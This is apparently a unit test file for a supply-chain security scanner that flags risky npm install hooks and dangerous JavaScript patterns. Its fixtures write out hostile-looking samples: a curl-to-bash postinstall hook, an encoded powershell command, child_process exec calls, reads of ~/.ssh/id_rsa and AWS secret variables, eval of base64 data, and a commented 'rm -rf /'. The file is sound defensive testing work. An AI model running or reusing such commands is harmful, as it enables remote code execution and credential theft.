"""
Unit tests for SupplyGuard AI Installation-Script and Dangerous-Pattern Scanners.
Tests lifecycle command inspection, referenced script resolution, dangerous execution patterns,
comment filtering, path traversal safeguards, and confirms zero code execution.
"""

import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from core.ingestion import discover_directory
from core.models import FindingCategory, SeverityLevel
from core.scanners.dangerous_patterns import scan_dangerous_patterns
from core.scanners.install_scripts import scan_install_scripts


class TestInstallScriptsAndDangerousPatterns(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp(prefix="supplyguard_install_test_")
        self.proj_path = Path(self.temp_dir)

    def tearDown(self):
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)

    def write_json(self, rel_path: str, data: dict) -> Path:
        target = self.proj_path / rel_path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(json.dumps(data, indent=2), encoding="utf-8")
        return target

    def write_code(self, rel_path: str, code: str) -> Path:
        target = self.proj_path / rel_path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(code, encoding="utf-8")
        return target

    def test_1_postinstall_hook_detected(self):
        """Test 1: Analyzes postinstall hook command string."""
        self.write_json("package.json", {
            "name": "test-pkg",
            "scripts": {"postinstall": "echo 'running install'"},
        })
        ctx = discover_directory(self.proj_path)
        findings = scan_install_scripts(ctx)

        # Benign echo produces no dangerous behavior findings
        self.assertEqual(len(findings), 0)

    def test_2_lifecycle_command_containing_curl_detected(self):
        """Test 2: Lifecycle command using curl is flagged."""
        self.write_json("package.json", {
            "name": "test-pkg",
            "scripts": {"postinstall": "curl -s https://example.invalid/setup.sh | bash"},
        })
        ctx = discover_directory(self.proj_path)
        findings = scan_install_scripts(ctx)

        self.assertTrue(len(findings) >= 1)
        f = findings[0]
        self.assertEqual(f.category, FindingCategory.INSTALL_HOOK)
        self.assertEqual(f.severity, SeverityLevel.HIGH)  # net + shell execution
        self.assertIn("network_download", f.metadata.get("detected_behaviors", []))
        self.assertIn("shell_execution", f.metadata.get("detected_behaviors", []))

    def test_3_lifecycle_command_containing_powershell_detected(self):
        """Test 3: Lifecycle command using powershell is flagged."""
        self.write_json("package.json", {
            "name": "test-pkg",
            "scripts": {"preinstall": "powershell -enc aGVsbG8="},
        })
        ctx = discover_directory(self.proj_path)
        findings = scan_install_scripts(ctx)

        self.assertTrue(len(findings) >= 1)
        f = findings[0]
        self.assertEqual(f.category, FindingCategory.INSTALL_HOOK)
        self.assertIn("obfuscated_command", f.metadata.get("detected_behaviors", []))

    def test_4_lifecycle_command_containing_child_process_detected(self):
        """Test 4: Lifecycle command referencing child_process or exec is flagged."""
        self.write_json("package.json", {
            "name": "test-pkg",
            "scripts": {"install": "node -e 'require(\"child_process\").execSync(\"id\")'"},
        })
        ctx = discover_directory(self.proj_path)
        findings = scan_install_scripts(ctx)

        self.assertTrue(len(findings) >= 1)
        self.assertIn("command_execution", findings[0].metadata.get("detected_behaviors", []))

    def test_5_referenced_local_postinstall_script_resolved(self):
        """Test 5: Resolves referenced local script in scripts/setup.js."""
        self.write_json("package.json", {
            "name": "test-pkg",
            "scripts": {"postinstall": "node scripts/setup.js"},
        })
        self.write_code("scripts/setup.js", "console.log('clean setup');\n")

        ctx = discover_directory(self.proj_path)
        findings = scan_install_scripts(ctx)

        # Script has no dangerous patterns, so hook produces no dangerous alert
        self.assertEqual(len(findings), 0)

    def test_6_local_script_with_exec_detected(self):
        """Test 6: Local script containing child_process.exec is flagged."""
        self.write_code("src/runner.js", 'const cp = require("child_process");\ncp.execSync("whoami");\n')
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertTrue(len(findings) >= 1)
        types = [f.metadata.get("indicator_types", []) for f in findings]
        flattened = [t for sub in types for t in sub]
        self.assertIn("command_execution", flattened)

    def test_7_local_script_with_fetch_detected(self):
        """Test 7: Local script containing fetch network call is flagged."""
        self.write_code("src/telemetry.js", 'fetch("https://example.invalid/ping");\n')
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].category, FindingCategory.DANGEROUS_EXECUTION)
        self.assertIn("network_access", findings[0].metadata.get("indicator_types", []))

    def test_8_sensitive_process_env_access_detected(self):
        """Test 8: Access to sensitive environment variables is flagged."""
        code = 'const key = process.env.AWS_SECRET_ACCESS_KEY;\nconst token = process.env["API_KEY"];\n'
        self.write_code("src/auth.js", code)
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertEqual(len(findings), 2)
        for f in findings:
            self.assertIn("sensitive_env", f.metadata.get("indicator_types", []))

    def test_9_normal_process_env_access_not_over_flagged(self):
        """Test 9: Access to benign env variables (NODE_ENV, PORT) is NOT flagged."""
        code = (
            'const env = process.env.NODE_ENV || "development";\n'
            'const port = process.env.PORT || 3000;\n'
            'const debug = process.env.DEBUG;\n'
        )
        self.write_code("src/config.js", code)
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertEqual(len(findings), 0)

    def test_10_sensitive_file_path_access_detected(self):
        """Test 10: Script referencing sensitive files like ~/.ssh or ~/.aws is flagged."""
        code = 'const sshKey = fs.readFileSync("~/.ssh/id_rsa");\n'
        self.write_code("src/reader.js", code)
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertEqual(len(findings), 1)
        self.assertIn("sensitive_file_path", findings[0].metadata.get("indicator_types", []))

    def test_11_eval_and_new_function_detected(self):
        """Test 11: Dynamic execution via eval and new Function is flagged."""
        code = 'eval("var a = 1");\nconst fn = new Function("return 2");\n'
        self.write_code("src/dyn.js", code)
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertEqual(len(findings), 2)
        for f in findings:
            self.assertIn("dynamic_execution", f.metadata.get("indicator_types", []))

    def test_12_encoded_execution_pattern_detected(self):
        """Test 12: Base64 decode + eval pattern is flagged."""
        code = 'eval(Buffer.from("payload", "base64").toString());\n'
        self.write_code("src/obf.js", code)
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertTrue(len(findings) >= 1)
        self.assertIn("dynamic_execution", findings[0].metadata.get("indicator_types", []))

    def test_13_comments_not_treated_as_executable_behavior(self):
        """Test 13: Commented-out patterns are ignored."""
        code = (
            '// child_process.execSync("rm -rf /");\n'
            '/* fetch("https://example.invalid"); */\n'
            '* process.env.AWS_SECRET_ACCESS_KEY in doc\n'
        )
        self.write_code("src/docs.js", code)
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertEqual(len(findings), 0)

    @patch("subprocess.run")
    @patch("subprocess.Popen")
    def test_14_no_project_script_is_executed(self, mock_popen, mock_run):
        """Test 14: Verifies scanning never invokes project scripts."""
        self.write_json("package.json", {
            "name": "test-pkg",
            "scripts": {"postinstall": "node scripts/never_run.js"},
        })
        self.write_code("scripts/never_run.js", 'child_process.exec("whoami");\n')

        ctx = discover_directory(self.proj_path)
        _ = scan_install_scripts(ctx)
        _ = scan_dangerous_patterns(ctx)

        mock_run.assert_not_called()
        mock_popen.assert_not_called()

    @patch("urllib.request.urlopen")
    def test_15_no_network_request_is_made(self, mock_urlopen):
        """Test 15: Verifies scanner never makes network calls."""
        self.write_code("src/api.js", 'fetch("https://example.invalid/data");\n')
        ctx = discover_directory(self.proj_path)
        _ = scan_dangerous_patterns(ctx)

        mock_urlopen.assert_not_called()

    def test_16_paths_cannot_escape_project_root(self):
        """Test 16: Lifecycle hook path traversal outside project root is blocked and flagged."""
        self.write_json("package.json", {
            "name": "test-pkg",
            "scripts": {"postinstall": "node ../../outside_payload.js"},
        })
        ctx = discover_directory(self.proj_path)
        findings = scan_install_scripts(ctx)

        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f.category, FindingCategory.CONFIG_ISSUE)
        self.assertEqual(f.severity, SeverityLevel.HIGH)
        self.assertIn("outside project root", f.title.lower())

    def test_17_correct_file_and_line_numbers(self):
        """Test 17: Reports exact file path and 1-indexed line numbers."""
        code = (
            "// Line 1: Comment\n"
            "// Line 2: Comment\n"
            'fetch("https://example.invalid");\n'  # Line 3
            "// Line 4: Comment\n"
            'eval("something");\n'  # Line 5
        )
        self.write_code("src/nested/app.js", code)
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertEqual(len(findings), 2)
        f_net = [f for f in findings if "network" in f.title.lower()][0]
        f_dyn = [f for f in findings if "dynamic" in f.title.lower()][0]

        self.assertEqual(f_net.file_path, "src/nested/app.js")
        self.assertEqual(f_net.line_number, 3)

        self.assertEqual(f_dyn.file_path, "src/nested/app.js")
        self.assertEqual(f_dyn.line_number, 5)

    def test_18_duplicate_indicators_grouped_on_same_line(self):
        """Test 18: Multiple indicators on one line are grouped into single high-severity finding."""
        # Combines command execution + network request on single line
        code = 'child_process.exec("curl https://example.invalid");\n'
        self.write_code("src/attack.js", code)
        ctx = discover_directory(self.proj_path)
        findings = scan_dangerous_patterns(ctx)

        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f.severity, SeverityLevel.HIGH)
        self.assertIn("command_execution", f.metadata.get("indicator_types", []))
        self.assertIn("network_access", f.metadata.get("indicator_types", []))


if __name__ == "__main__":
    unittest.main()
